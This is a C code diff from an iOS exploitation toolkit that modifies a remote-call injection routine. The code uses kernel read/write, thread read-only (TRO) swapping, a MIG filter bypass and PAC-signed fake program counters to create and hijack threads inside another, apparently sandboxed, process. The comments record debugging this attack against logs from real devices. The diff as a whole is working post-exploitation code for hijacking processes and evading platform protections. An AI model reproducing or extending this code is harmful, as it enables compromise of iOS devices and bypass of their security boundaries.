@@ -868,11 +868,13 @@ static bool tro_swap_thread_op(uint64_t targetThread,
         break;
     }
 
+    // Match set_exception_port_on_thread: unlock dummy mutex and return.
+    // Do NOT pthread_join — on TRO miss the helper stays blocked in
+    // thread_suspend/set_state and join hangs forever (log 16:13: main @0x201
+    // WATCHDOG while parked waiting for this return).
     thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
-    if (pthread_join(pthread, NULL) != 0) {
-        pthread_cancel(pthread);
-        pthread_join(pthread, NULL);
-    }
+    if (useMigFilterBypass)
+        usleep(100000);
     mach_port_deallocate(mach_task_self_, machThread);
     if (!success)
         RC_DIAG("TRO %s: failed to locate/swap TRO", tag ? tag : "op");
@@ -2009,23 +2011,27 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     bool createdSuspended = false;
 
     if (!ios26StubPthread) {
-        uint64_t heapOut = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-        if (!g_RC_success || !heapOut) {
-            RC_DIAG("malloc heapOut failed");
+        // Fl0rk: out = SP-0x100 (trojanMemTemp). heapOut was wrong — create
+        // wrote nothing we could observe (log: krw=sb=canary). Soft-fail →
+        // thread[1]. Never unsigned sleep.
+        uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+        if (!g_RC_success || !heapBounce) {
+            RC_DIAG("malloc heapBounce failed");
             fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
             return -1;
         }
-        if (!remote_write64(heapOut, kCanary)) {
-            RC_DIAG("canary remote_write to heapOut FAILED");
-            do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
+        if (!remote_write64(heapBounce, kCanary)) {
+            RC_DIAG("canary remote_write to heapBounce FAILED");
+            do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
             fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
             return -1;
         }
-        RC_DIAG("heapOut=0x%llx canary planted", (unsigned long long)heapOut);
+        // Plant canary onto live SB stack page via SB memcpy (remap≠stack).
+        do_remote_call_temp(100, "memcpy", trojanMemTemp, heapBounce, 8, 0, 0, 0, 0, 0);
+        clear_remote_shmem_cache();
+        RC_DIAG("Fl0rk out planted canary via SB memcpy out=0x%llx bounce=0x%llx",
+                (unsigned long long)trojanMemTemp, (unsigned long long)heapBounce);
 
-        // Try several start_routines. Soft-fail always → thread[1] TRO-swap.
-        // Log proved remote dlsym(RTLD_DEFAULT,-2)=NULL on 17.5.1 SB; hard-fail
-        // there skipped the working inject-thread path. Never unsigned sleep.
         uint64_t startRoutine = 0;
         const char *startKind = "none";
 
@@ -2041,7 +2047,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 } else {
                     RC_DIAG("remote dlsym(DEFAULT,getpid)=0 — try dlopen libsystem_c");
                     startRoutine = 0;
-                    // 2) dlopen(libsystem_c) + dlsym
                     uint64_t pathBuf = do_remote_call_temp(100, "malloc", 64, 0, 0, 0, 0, 0, 0, 0);
                     if (g_RC_success && pathBuf &&
                         remote_writeStr(pathBuf, "/usr/lib/system/libsystem_c.dylib")) {
@@ -2058,35 +2063,35 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             }
         }
 
-        // 3) Fl0rk-style PAC'd FAKE_PC 0x301
+        // 2) Fl0rk-style PAC'd FAKE_PC 0x301
         if (!startRoutine) {
             startRoutine = remoteCrashSigned;
             startKind = "pac_0x301";
         }
 
-        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx heapOut=0x%llx",
-                startKind, (unsigned long long)startRoutine, (unsigned long long)heapOut);
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx",
+                startKind, (unsigned long long)startRoutine,
+                (unsigned long long)trojanMemTemp);
 
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                    heapOut, 0, startRoutine, 0, 0, 0, 0, 0);
+                                                    trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
         uint64_t pthreadAddr = 0;
         if (g_RC_success && createResult == 0) {
+            // Read *out via SB memcpy stack→heap (authoritative); never trust
+            // pre-create remap of stack page.
             clear_remote_shmem_cache();
-            pthreadAddr = remote_read64(heapOut);
-            do_remote_call_temp(100, "memcpy", heapOut, heapOut, 8, 0, 0, 0, 0, 0);
+            remote_write64(heapBounce, kCanary);
+            do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
             clear_remote_shmem_cache();
-            uint64_t pthreadAddrSB = remote_read64(heapOut);
-            RC_DIAG("post-pthread heapOut=0x%llx krw=0x%llx sb=0x%llx",
-                    (unsigned long long)heapOut,
-                    (unsigned long long)pthreadAddr,
-                    (unsigned long long)pthreadAddrSB);
-            if (pthreadAddrSB && pthreadAddrSB != kCanary)
-                pthreadAddr = pthreadAddrSB;
+            pthreadAddr = remote_read64(heapBounce);
+            RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
+                    (unsigned long long)trojanMemTemp,
+                    (unsigned long long)pthreadAddr);
         } else {
             RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
                     (unsigned long long)createResult, (int)g_RC_success);
         }
-        do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
+        do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
 
         if (pthreadAddr && pthreadAddr != kCanary) {
             callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
@@ -2220,9 +2225,10 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 (unsigned long long)g_RC_callThreadAddr,
                 (unsigned long long)park.__pc,
                 (unsigned long long)park.__lr);
+        RC_DIAG("TRO-swap park begin (no join; fail restores main)");
         if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, park.__pc, park.__lr,
                                              useMigFilterBypass)) {
-            RC_DIAG("TRO-swap park failed");
+            RC_DIAG("TRO-swap park failed — restoring main @0x201");
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
